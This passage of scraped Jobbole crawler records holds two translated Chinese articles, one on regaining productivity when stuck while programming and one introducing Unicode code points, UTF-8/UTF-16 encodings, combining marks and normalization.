class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/b94146f42c8e0ca2b0f04ed89b59053c.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/06/12", "praise_nums": 1}
{"tags": "职场", "front_image_path": "full/0f57a2809d0ba0e14cc9ce0d33e30e92cb2592f0.jpg", "title": "当程序员写不出代码了，该怎么办？", "url_object_id": "b5709595a395f4b5a13dd3a5fec89a8c", "url": "http://blog.jobbole.com/109617/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://blog.klimczyk.pl/2017/05/04/what-to-do-when-programming-sucks/\">PAWEL KLIMCZYK</a>   译文出处：<a target=\"_blank\" href=\"http://www.codeceo.com/article/what-to-do-programming-sucks.html\">码农网/小峰</a>   </div><p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgcoxrjw24j21b80vd7wh.jpg\" width=\"600\" height=\"398\"></p>\n<p>你已经对着电脑 n 个小时了。敲键盘正成为一种负担，你在想，键盘是否就像西西弗斯推着的那块巨石。</p>\n<blockquote><p>伯乐在线转注：西西弗斯是希腊神话中的人物，与更加悲剧的俄狄浦斯王类似，西西弗斯是科林斯的建立者和国王。他甚至一度绑架了死神，让世间没有了死亡。最后，西西弗斯触犯了众神，诸神为了惩罚西西弗斯，便要求他把一块巨石推上山顶，而由于那巨石太重了，每每未上山顶就又滚下山去，前功尽弃，于是他就不断重复、永无止境地做这件事——诸神认为再也没有比进行这种无效无望的劳动更为严厉的惩罚了。<span style=\"color: #ff0000;\">西西弗斯的生命就在这样一件无效又无望的劳作当中慢慢消耗殆尽</span>。（摘自百科）</p></blockquote>\n<p>咖啡一杯接着一杯。不敢再喝了，因为搞不好要有副作用了，心跳加速，身体不由自主地颤抖，出冷汗，但还是无法产出任何代码。</p>\n<p>所有重新发现编程趣味的努力都徒劳无功，因为你的最后一点能量都用来驱逐大脑中正在攻城略地的话：</p>\n<blockquote><p>“我写不出代码了！”</p></blockquote>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fgi67zx8rng20e80aoqj7.gif\"></p>\n<h2>编程的本质是棘手</h2>\n<p>即使是最优秀的<span class=\"wp_keywordlink\">程序员</span>也会遭遇无法解决的软件工程问题。碰到这样的问题，并不一定意味着你缺乏技能或知识。</p>\n<p>编程不是一项容易的工作，我们可以通过采取非正统的方法来保持你想要的生产力水平，并确保提交高质量的代码。</p>\n<p>如果我在一个问题上花了几个小时，却仍然找不到解决方案的话，最后我会觉得这是浪费了时间。我不是胡言乱语——我只是觉得“没有人能够百死不悔”。</p>\n<p>没有愤怒和悲伤。因为我已经尝试过所有方向，只是都走不通而已。失去希望，于是开始想辞职不干。我觉得自己应该换工作，去做做调酒师或其他，至少研究和测试在啤酒中加点什么不会耗去我数个小时的时间。</p>\n<p>这些都是我在不敲代码时的想法。我开始怀疑生活，怀疑编码，怀疑人生。</p>\n<p>有成效不？好吧，我从来没听任何专家说过“辞职和萎靡不振”可以造就伟大的代码，所以可能并没有成效。</p>\n<p>这就提出了一个问题：我们该如何避免这种没有成效的状态？</p>\n<h2>重新发现问题，重新发现你的生产力</h2>\n<p>可能你已经行进在这条路上了。那么此时你只要继续就可以了，我可能没有什么新的东西可以告诉你的。</p>\n<p>如果你是新手，那么可能你还不知道如何重新发现生产力。</p>\n<p>下面我要分享的内容将有助于你在编程时以一种健康的方式保持生产力，不至于筋疲力竭。主要包括：</p>\n<ul>\n<li>测试不同的解决方案，直到感觉重复</li>\n<li>在线寻找开源解决方案</li>\n<li>向更有经验的程序员询问</li>\n<li>如果一切都失败，那就潇洒放手</li>\n</ul>\n<h3>1 – 测试不同的解决方案，直到感觉重复</h3>\n<p>在你研究或询问其他开发人员（=浪费他们的时间）之前，你应该尝试使用你现有的知识和思维来制定每一个可能的解决方案。</p>\n<p>显而易见的是，太多的程序员是从询问他人开始的，自己甚至都不曾静下心来分析问题本身。不要成为这样的讨厌鬼，尽可能不要浪费别人的时间。</p>\n<p>先投身于工作，然后再寻求帮助。</p>\n<h3>2 – 在线查找开源代码</h3>\n<p>当你投入于工作，却没有什么成果的时候，那么下一步你可以尝试开源代码。许多编程人员构建软件，是出于创造解决方案并在线发布以供大家使用的乐趣。有些人发布的代码曾被它们的程序员使用于商业项目。</p>\n<p>GitHub 是寻找开源代码的两个主要地方之一。另一个是 StackOverflow。</p>\n<p>这些网站的解决方案是采用可重用代码的形式，方便你在项目中实现。</p>\n<p>谨记，使用其他人开发的代码总是有风险的。它可能会以你意想不到的方式改变程序的行为。备份原始代码，这是常识。</p>\n<h3>3 – 向更有经验的程序员询问</h3>\n<p>你有没有碰到过这样的情况，向其他人求助却发现你甚至不知道自己在问什么？</p>\n<p>在询问任何人之前，你得准备好一些你无法通过网络信息搜索解答的问题。</p>\n<p>明确的问题，才能有明确的解决方案。如果是你自己都描述得云里雾里的问题——那么你只会得到一个云里雾里的回答（并且可能会惹恼他人）。</p>\n<p>如果你周围没有任何开发者可以询问，那么也可以在线查找。你可以在StackOverflow或MSDN社交论坛上询问，或查找特别针对于你所用技术的Slack频道。</p>\n<h3>4 – 如果一切都失败，那就潇洒放手</h3>\n<p>不要一心钻在死胡同里，实在不行，那就去干点别的事——睡觉，吃东西，等等。</p>\n<p>你觉得这是在逃避工作？那就错了。</p>\n<p>我要告诉你的是，当你最轻松的时候，往往正是解决办法灵机一现的时候，这不是我胡编乱造的，而是有科学的证明。此时你的大脑工作在“发散思维”的模式下，而不是在“集中注意力”的模式下——你可以在这篇文章中了解之间的差异。</p>\n<p>总的来说，这个理念就是要你忘记手头的问题，让你的意识心灵沉浸到其他的事情中。此时，你的潜意识则开始连接要点，朝着顿悟的方向前行。</p>\n<p>我们可以做些什么以便于帮助大脑在发散思维的模式下工作呢？放轻松就好了：</p>\n<ul>\n<li>散步（古代哲学家非常习惯于在走路时演讲，因为他们意识到走路有助于思考）</li>\n<li>清理办公室或住所（完成后给自己一个奖励）</li>\n<li>与朋友约会，和杯咖啡，聊聊八卦（如果你过于关注问题的话，那么建议和不能提供帮助的非编码人员交谈）</li>\n</ul>\n<h2>总结</h2>\n<p>我在编程和生活两者之间保持了一种健康的平衡。</p>\n<p>无论你是为了兴趣爱好、钱还是改变世界的宏图伟业而选择编程——编程都不应该是你唯一痴迷的东西，否则你会走火入魔。</p>\n<p>最后再说一句，如果你绞尽脑汁，却仍然无法解决问题，那么不妨先放一放。通过潜意识的运作，搞不好突破性的想法就会灵光乍现。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"109617\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"109617votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"109617\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgcoxrjw24j21b80vd7wh.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/06/12", "praise_nums": 1}
{"tags": "IT技术,Unicode", "front_image_path": "full/da0d018799c09c4d13b1a9eea8f2e617d1219710.jpg", "title": "写给程序员的 Unicode 入门介绍", "url_object_id": "e2f9b017ee6039fdacf6194ecc51a729", "url": "http://blog.jobbole.com/111261/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/daofazi\">逆旅</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://reedbeta.com/blog/programmers-intro-to-unicode/\">Nathan Reed</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffv4y7078mj20a200qmx6.jpg\"></p>\n<p>程序员世界对这个名字发自内心的恐惧和敬畏。我们都知道在我们的软件中应该 “支持 Unicode”（无论是什么意思——对所有的字符串使用 wchar_t，是吗？）。但 Unicode 很深奥，它有千页的 <a href=\"http://www.unicode.org/versions/latest/\">Unicode 标准</a>，还有几十页的补充附录、报告和<a href=\"http://www.unicode.org/notes/\">注解</a>，简直太吓人了。即使 Unicode 诞生 30 多年后，程序员们还觉得它很神秘。</p>\n<p>几个月前，我开始对 Unicode 着迷，决定花些时间仔细了解一番。在本文，我来从程序员的视角对其做介绍。</p>\n<p>我主要关注字符集，与字符串处理和 Unicode 文本相关的东西。因此，这里我不会过细地聊字体、文本布局、形状、渲染，或本地化，那些是另外的议题，超出了我的能力（知识）范围。</p>\n<h2>多样性和内在复杂性</h2>\n<p>当你开始学习 Unicode，有一件事情很明显，就是它和你熟悉的字符集（比如 ASCII）相比，Unicode 复杂性要高了一大截。这不仅仅是指 Unicode 包含了很多的字符，虽然这是一个方面。Unicode 还有很多内部结构，特性和特殊情况，使其不只是人们所认为的纯粹的“ 字符集”。本文后续会介绍一些相关内容。</p>\n<p>当面对所有的复杂性时，尤其是作为工程师，很难不问自己，“为什么我们需要这么多？真的有必要吗？可以简化吗？”</p>\n<p>然而，Unicode 的目标是准确地表示全世界的书写系统（writing systems）。Unicode 协会的目标是“让全世界的人们不论什么语言都可以使用电脑”，所以你可想见，书面语言的多样性是巨大的！迄今为止，Unicode 支持135 种不同的书写系统，包含约 1100 种语言，但目前还有超过 <a href=\"http://linguistics.berkeley.edu/sei/\">100 种书写系统没有支持</a>，包括现代的和已成为历史的，Unicode 协会还在努力将其加进来。</p>\n<p>鉴于分支的多样性，要表示它们必然是一个复杂的项目。Unicode 接受了它的多样，接受了任务（包含所有人类的书写系统）中的内在复杂性，它没有在名字简化上做太多取舍，但是它对需要完善任务的地方的规则，做了异常处理。</p>\n<p>此外，Unicode 承诺不仅支持单一语言的文本，还支持多种语言共存于一个文本中——引进了更多的复杂性。</p>\n<p>大多数编程语言都有处理底层文本操作的的库，但是作为程序员，你仍然需要知道一些 Unicode 特性 ，知道何时怎样去应用它。要了解这些东西可能得花些时间动动脑筋，但别灰心——想想有数以亿计的人，如果你的软件支持他们的语言，那他们也可以使用你的软件哒。所以，拥抱复杂吧！</p>\n<h2>Unicode 编码空间</h2>\n<p>我们先从几个大的方向入手。Unicode 的基本元素 —— 它的 “字符”，虽然这种叫法不是太贴切——被称作编码点（Code Point）。编码点通过数字来区分，通常写成 16 进制的形式再加前缀“U+”，例如 <a href=\"http://unicode.org/cldr/utility/character.jsp?a=A\">U+0041 表示拉丁字母 “A”</a> 、<a href=\"http://unicode.org/cldr/utility/character.jsp?a=%CE%B8\">U+03B8 表示 希腊字母 “θ”</a>。每个编码点都有一个简称，还有一些其他属性，<a href=\"http://www.unicode.org/reports/tr44/\">Unicode 字符数据库</a> 对此有详细说明。</p>\n<p>所有编码点组成的集合被称作编码空间（Code Space）。Unicode 编码空间包含 1,114,112 个编码点。然而，其中只有128,237 个编码点 —— 编码空间的 12% 被赋值，目前。还有很多空间用来增长！Unicode 还保留了另外 137,468 字符 作为 “自用” 空间，这些字符没有标准的含义，可以被个人应用所使用。</p>\n<h3>空间分配</h3>\n<p>为了对编码空间的布局有个了解，把它可视化会比较直观。下面是整个编码空间的布局，一个像素代表一个编码点。使用小方块来表示以保证视觉的一致性；每个小方块是 16×16 = 256 个编码点，每个大方块是一个面有 65536 个 编码点。总共加起来有 17 个面板。</p>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffv3s279ehj20x615e3ye.jpg\"></p>\n<ul>\n<li>白色表示未用空间；</li>\n<li>蓝色表示已用空间；</li>\n<li>绿色表示自用区域；</li>\n<li>小的红色区域是代理区（surrogates，后面会讲）。</li>\n</ul>\n<p>如你所见，被使用的区域分布有点稀疏，但都集中在前三个面里。</p>\n<p>0 号面板也被称作 “基本多语言面板（Basic Multilingual Plane，简称 BMP）”。BMP 包含现代文本所需的基本所有字符，包括拉丁文、斯拉夫文、希腊文、汉字（中国），日文、朝鲜文、阿拉伯文、希伯来文、梵文（印度）等等。</p>\n<p>（过去，编码空间只有 BMP 而已—— Unicode 最初设想是 一个 16 Bit 的编码，只包含 65536 个字符。在 1996 年扩充到现在的规模。然而，绝大多数现代字符属于 BMP。）</p>\n<p>1 号面板包含历史上的文字，比如苏美尔楔形文字和埃及象形文字，还有 emoji 和其他各种符号。2 号面板包含一大块不常用的和历史上的汉字字符。剩下的面是空的，除了 14 号面板中有一小部分被用作格式化字符；15-16 号面板全部保留自用。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffv530saw0j20zk0k04b3.jpg\"></p>\n<h3>书写系统</h3>\n<p>让我们放大前三个面板，因为这是最重要的部分：</p>\n<p> </p>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffv3s5u04zj21dw0h0jre.jpg\" width=\"1796\" height=\"612\"></p>\n<p>这张图用颜色表示了 Unicode 中135 种不同的书写系统。你可以看到汉字（蓝色）和朝鲜语（棕色）占了 BMP 很大一部分（右边的大方块）。与之相对，此图中所有的欧洲，中东，南亚语言加起来刚好占了 BMP 的第一行。</p>\n<p>编码空间的很多区域都和更早的编码兼容或相同。例如，Unicode 的前 128 个字符就是 ASCII 的拷贝。显然是对兼容性很有好处——很容易无损的从小编码转向 Unicode （反过来也一样，只要没有使用小编码之外的字符）。</p>\n<h3>使用频率</h3>\n<p>可视化编码空间还有一个有趣的方法，就是看使用频率的分布——换句话说，就是每个编码点在真实世界中使用的频率。0-2 号面的热力图是基于来自维基百科 和 推特（所有语言）的大量文本所得。频率增长的方向是黑（没出现）、红、黄、白。</p>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffv3s9a237j21dw0h040p.jpg\"></p>\n<p>你可以看到，绝大多书样本文本都分布在 BMP 中，有些零散的使用来自1-2 号面。最大的异常是 emoji，它点亮了 1 号面最底下那的几个小方块。</p>\n<h2>编码</h2>\n<p>我们知道 Unicode 编码点，通过它们在编码空间中的下标来定义，范围从 U+0000 到 U+10FFFF。但是在内存或文件中编码点如何用字节表示呢？</p>\n<p>对计算机友好的最省事方式是用 32 位整数来存储编码点下标。这样做是可行，但是每个字符用 4 个字节有点浪费。当你处理大量文本的时候，使用 32 位整数存储 Unicode 会占用大量额外存储、内存、带宽等。</p>\n<p>于是，Unicode 有了几个紧凑的编码 。32 位整数编码被称作 UTF-32（UTF=”Unicode Transformation Format”），但是很少被用来存储。顶多作为临时内部表示出现，用来检查或操作字符串中的编码点。</p>\n<p>最常见的是，你会看到 Unicode 文本被编码为 UTF-8 或 UTF-16。这些都是可变长度编码，分别由 8-bit 或 16-bit 为一个单元组成。这些方案中，下标值较小的编码点占用的字节数也少，会节省不少内存。这样做的代价是处理 UTF-8/16 需要以编程的方式来处理，会慢一些。</p>\n<h3>UTF-8</h3>\n<p>在 UTF-8 中，每个编码点依据下标值，被存储为 1 到 4 个字节。</p>\n<p>UTF-8 使用二进制前缀系统，在此系统中每个字符的最高位的几个比特表明它是否是单个字节，多字节序列的开始，或中间字节；剩余的比特连接起来表示编码点的下标。下面的表格展示了UTF-8 是如何编码的：</p>\n<table>\n<thead>\n<tr>\n<th>UTF-8 (二进制)</th>\n<th>编码点 (二进制)</th>\n<th>范围</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0xxxxxxx</td>\n<td>xxxxxxx</td>\n<td>U+0000–U+007F</td>\n</tr>\n<tr>\n<td>110xxxxx 10yyyyyy</td>\n<td>xxxxxyyyyyy</td>\n<td>U+0080–U+07FF</td>\n</tr>\n<tr>\n<td>1110xxxx 10yyyyyy 10zzzzzz</td>\n<td>xxxxyyyyyyzzzzzz</td>\n<td>U+0800–U+FFFF</td>\n</tr>\n<tr>\n<td>11110xxx 10yyyyyy 10zzzzzz 10wwwwww</td>\n<td>xxxyyyyyyzzzzzzwwwwww</td>\n<td>U+10000–U+10FFFF</td>\n</tr>\n</tbody>\n</table>\n<p>UTF-8 有一个方便的属性，即最开始128 个字符（ASCII字符）被编码为单个字节，所有的非 ASCII 字符被编码为 128-255。这产生了两个好处。首先，任何已经是 ASCII 编码的字符串和文件无需转换就可以被 UTF-8 识别。其次，大量的广泛使用的编程惯例——比如 NULL 结尾，分隔符（n,t,’,’,”)等——在 UTF-8 中也是可用的。ASCII 字节不会出现在非 ASCII 编码点中，所以搜索以 NULL 结尾或分隔符结尾的字符串是可以的。</p>\n<p>多亏了这个便利，使扩展遗留 ASCII 程序和 API 来处理 UTF-8 字符变得简单。UTF-8 被广泛运用在 Unix、Linux 和网络世界中，还有许多程序员主张 <a href=\"http://utf8everywhere.org/\">UTF-8 应该作为任何地方的默认编码</a>。</p>\n<p>然而，UTF-8 还不能全面替代 ASCII。例如，遍历字符串中的 “字符” 的代码需要解码 UTF-8 并遍历编码点（或字位簇（grapheme cluster）——后面会讲到），而不是字节。当你测量字符串 “长度” 时，你得考虑是要字节长度，还是编码点长度，还是文本渲染的宽度为单位的长度还是其它长度。</p>\n<h3>UTF-16</h3>\n<p>你可能遇到的另一个编码是 UTF-16。它使用 16-bit 字，每个字符被存储为 1 个或 2 个字。</p>\n<p>和 UTF-8 一样，我们可以用二进制前缀的形式表示 UTF-16 的编码规则：</p>\n<table>\n<thead>\n<tr>\n<th>UTF-16(二进制)</th>\n<th>编码点（二进制）</th>\n<th>范围</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>xxxxxxxxxxxxxxxx</td>\n<td>xxxxxxxxxxxxxxxx</td>\n<td>U+0000–U+FFFF</td>\n</tr>\n<tr>\n<td>110110xxxxxxxxxx 110111yyyyyyyyyy</td>\n<td>xxxxxxxxxxyyyyyyyyyy + 0x10000</td>\n<td>U+10000–U+10FFFF</td>\n</tr>\n</tbody>\n</table>\n<p>但是，通常人们谈到 UTF-16是因为它涉及到了一个在编码点术语中被称作“代理（surrogate）”的东西。所有在范围 U+D800-U+DFFF（或在其他范围） 中的编码点，这些和上表中二进制前缀 110110 和 110111 匹配的编码点——是 UTF-16 中的保留区域，它们自身不表示任何有效的字符。它们仅用于上面 2 个字的编码模式中，被称作“代理对（surrogate pair）”，代理编码点在任何其他情况下都是非法的！它们不能出现在 UTF-8 和 UTF-32 中。</p>\n<p>在过去，UTF-16 是1996 年之前的 Unicode 版本的派生物，那时只有 65536 个编码点。初衷是不应有不同的编码，Unicode 应该是简单的16-bit 字符集。后来，编码空间被扩充用来表示不常用的（仍然重要）的汉字字符，这是 Unicode 设计者之前没计划的。代理区在那时被引进，直说了吧，作为拼凑，允许16-bit 编码访问新的编码点。</p>\n<p>如今，Javascript 使用 UTF-16 作为其标准的字符串表示：如果你问一个字符串的长度，或遍历它等，结果都以 16-bit 的字为单位，同时任何 BMP 之外的编码点都用代理对表示。UTF-16 也被微软 WIN32 API 使用；尽管 Win32 同时支持 8-bit 和 16-bit 字符串，但是 8-bit 版本仍然莫名其妙地不支持 UTF-8——只支持使用旧编码的代码，像 ANSI。这使得 UTF-16 成为在 Windows 上获得 Unicode 支持的唯一方法。</p>\n<p>顺便说一下，UTF-16 字符可以大端存储，也可以小端存储。Unicode 在这个问题上没有说明，虽然它确实鼓励一个惯例，即把 <a href=\"http://unicode.org/cldr/utility/character.jsp?a=FEFF\">U+FEFF 零宽无间断间隔</a>这个字符放到 UTF-16 文件开头作为<a href=\"https://en.wikipedia.org/wiki/Byte_order_mark\">字节序标识</a>，来消除字节序问题。（如果文件和系统的字节序不同，BOM（ByteOrderMark） 会被解码为 U-FFFE，这不是一个有效的编码点。）</p>\n<h2>组合标记</h2>\n<p>目前为止，我们一直在讨论编码点。但是 Unicode 中，字符比单独的编码点更复杂！</p>\n<p>Unicode 包含一个系统，可以合并多个编码点，动态组合字符。此系统用各种方式增加灵活性，而不引起编码点的巨大组合膨胀。</p>\n<p>例如，在欧洲语言中，组合标记出现在变音符和字母的使用中。 Unicode 支持各种各样的变音符号，包括尖音符号的和重音符号、元音变音符号、变音符号等等。所有这些变音符可以被使用在任何字母表的字母中。事实上，多个变音符号可以被使用在一个字母上。</p>\n<p>如果 Unicode 试图为每个字母组合或变音符组合分配一个独立的编码点，事情会变得无法控制。相反，动态组合系统可以让你构造你想要的任何字符，通过以一个基础编码点（字母）开始然后附加额外的编码点，被称作“组合标识”，来指定变音符。当一个文字渲染器看到字符串中有这样的序列时，它会自动堆叠变音符到基础字母的上面或下面来造出一个组合字符。</p>\n<p>例如，带重音的字符“Á” 会被表示成由两个编码点组成的字符串：<a href=\"http://unicode.org/cldr/utility/character.jsp?a=A\">U+0041 “A” 拉丁大写字母 a</a> 加上 <a href=\"http://unicode.org/cldr/utility/character.jsp?a=0301\">U+0301 “◌́”组合尖音符号</a>。这个字符串自动被渲染成单个字符：“Á”。</p>\n<p>如今，Unicode 还包含许多 “预设的” 编码点，每个表示一个被使用过的组合，例如 <a href=\"http://unicode.org/cldr/utility/character.jsp?a=%C3%81\">U+00C1 “Á” 带锐音符的拉丁大写字母A </a>或 <a href=\"http://unicode.org/cldr/utility/character.jsp?a=%E1%BB%87\">U+1EC7 “ệ” 带扬抑符和下点的小写拉丁字母 e</a>。我怀疑这些大多继承自融入 Unicode 的旧编码，来保证兼容性。实际上，对于欧洲语言中的大多数常见的带变音符号的字母都有预设，所以文本中动态组合用的不多。</p>\n<p>可是，组合标志系统确实允许任意数量的变音符号被叠加到任何基础字符上。使用归谬法的 <a href=\"https://eeemo.net/\">Zalgo 文本</a>，它通过随机叠加任意数量的变音符号在每个字母上，让它溢出行距，产生混乱现象。（如下图）</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffv3scnzygj20jl04b0ts.jpg\"></p>\n<p>Unicode 中出现动态组合字符的其他地区：</p>\n<ul>\n<li>阿拉伯文和希伯来文中的<a href=\"https://en.wikipedia.org/wiki/Vowel_pointing\">元音标记</a> 。这些语言中，单词通常由元音拼写。它们有变音符号标记元音（用在字典，语言教学材料，儿童教材，等地方）。这些变音符号用组合标记表示。</li>\n<li>\n<table>\n<thead>\n<tr>\n<th>希伯来文，带注音符号：</th>\n<th>אֶת דַלְתִּי הֵזִיז הֵנִיעַ, קֶטֶב לִשְׁכַּתִּי יָשׁוֹד</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>正常文本（不带注音符号）：</td>\n<td>את דלתי הזיז הניע, קטב לשכתי ישוד</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li><a href=\"https://en.wikipedia.org/wiki/Devanagari\">天成体（梵文）</a>，这种文字被用在印度北部，梵文和其他南亚语言中，用组合标记标识特定元音的附加到辅音字母上。例如，“ह” + “ि” = “हि” (“h” + “i” = “hi”).</li>\n<li>表示音节的朝鲜字符，但是它被称作<a href=\"https://en.wikipedia.org/wiki/Hangul#Letters\">Jamo</a> ，用来表示音节中的元音和辅音。当然也有为朝鲜文预制的编码点，同时也可以动态组合它们的 jamo。例如，“ᄒ” + “ᅡ” + “ᆫ” = “한” (“h” + “a” + “n” = “han”).</li>\n</ul>\n<h3>规范等价性</h3>\n<p>Unicode 中，预设字符和动态组合系统并存。后果就是有多种方法表示同一个字符串——不同编码点序列产生相同用户可感知的字符。例如，我们之前看到的，表示字符 “Á”，我们可以用一个编码点 U+00C1 ，也可以用两个编码点 U+0041 和U+0301。</p>\n<p>另一个歧义来源是一个字符中的多个注音符号。当两个注音符号作用在同意个基本字符上面时，注音符号的顺序很重要，例如，都在上面：”ǡ“ （点然后长音符）和 ”ā̇“ （长音符然后点）是不一样的。 然而，当音节运用在不同边时，例如。一个在上边一个在下边，编码点的顺序不会影响渲染。此外，一个有多个音节的字符，它可能会由一个预制的编码点再加其余的编码点来表示。</p>\n<p>例如，越南字母“ệ” 可以用以下五种方式表示：</p>\n<ul>\n<li>完全预设：U+1EC7 “ệ”</li>\n<li>部分预设：U+1EB9 “ẹ” + U+0302 “◌̂”</li>\n<li>部分预设：U+00EA “ê” + U+0323 “◌̣”</li>\n<li>完全分解：U+0065 “e” + U+0323 “◌̣” + U+0302 “◌̂”</li>\n<li>完全分解： U+0065 “e” + U+0302 “◌̂” + U+0323 “◌̣”</li>\n</ul>\n<p>Unicode 把这样的字符串集合称作 “规范等价”字符。在搜索、排序、渲染、文本选择等操作中，规范等价字符应该被同等对待。这影响到了你如何实现文本的操作。例如，假设你的程序有“查找”操作，用户搜索 “ệ”，理论上应当找到如上所有出现的所有版本的 “ệ”！</p>\n<h3>形式正规化</h3>\n<p>要解决如何处理等值字符串的问题，Unicode 定义了几种正规形式：是几种把字符串转化成规范形式的方法，这样它们就可以被逐点比较（或按字节比较）。</p>\n<p>“NFD” 正规化方法，完全分解每个字符到基本部件和组合标记，去掉字符串中任何预制的编码点。还会按渲染位置排列每个组合标记，举个例子，在字母底下的注音符号要比在上边的靠前。（不会重排有相同渲染位置的注音符号，因为它们的位置关系是可视的，前面提到过。）</p>\n<p>“NFC” 正规化方法，反过来，尽可能的把编码点替换成预制编码点。如果使用了不常用的注音符号组合，可能不会有任何预制的编码点，这种情况下 NFC 仍然替换它可以替换的，然后留下组合标志（和 NFD一样，还是会按渲染顺序重新排序）。</p>\n<p>还有一些方法被称作 NFKD 和NFKC。 这里的 “K” 指的是兼容性分解，它包含了某种程度上“相似”但是视觉上不同的字符。但我不打算讲这些。</p>\n<h3>字位簇</h3>\n<p>如上所见，Unicode 包含多种情况，用户认为的一个“字符” 事实上底下可能由多个编码点组成。Unicode 使用「字位簇」的概念来表示这种情况。一个由一个或多个编码点组成的字符串构成一个 “用户感知的字符”。</p>\n<p><a href=\"http://www.unicode.org/reports/tr29/\">UAX #29</a> 为字位丛定义了精确的规则。它大约是 “一个基本的编码点接着任意数量的组合标记”，但是真实的定义有点复杂；它包含了朝鲜语字母，和 emoji ZWJ 序列。</p>\n<p>字位簇主要被用在文本编辑：它们对光标和文本选择来说是最明显的单元。使用字位簇，确保在复制和粘贴文本时不会突然丢掉一些符号，同时左右方向键也总是以一个可见字符的距离移动，等等。</p>\n<p>另一个用到字位簇的地方是，执行字符串长度限制——比如在数据库域中。其实，底层的限制可能是类似 UTF-8 中的字节长度之类的东西，你不能简单的通过截断字节的方式来限制长度。至少，你得 “舍去” 最近的编码点；但更好的是，舍去最近的字位簇。除此以外，你可以通过舍弃它的一个注音符号破坏一个字符，中断一个 jamo 序列或 ZWJ 序列。</p>\n<h2>更多···</h2>\n<p>从程序员的角度来看，关于 Unicode 还有很多东西可以讲！我还没有深入一些有趣的主题，比如映射、排序、兼容性分解和容易混淆的词，Unicode 正则表达式，和双向文本。还有个我没谈到的是实现主题——如何有效存储和查找分布稀疏的编码点数据，或着如何优化 UTF-8 解码、字符串比较和NFC 标准化。也许我会在未来的文章中讲到这些。</p>\n<p>Unicode 是个令人着迷的复杂系统。在字节和编码点之前有多对一的映射，除此之外编码点和“字符”之间也有（某些情况下多对多）多对一的映射关系。在每个角落都有古怪的特例。没人声称表示全部书写系统很容易，但很明显我们不会回到使用不兼容编码来拼凑的艰难岁月了。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/11/4ec823de9f4637cdb4ee2f4b27a0aba9.png\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111261\" class=\" btn-bluet-bigger href-style vote-post-up   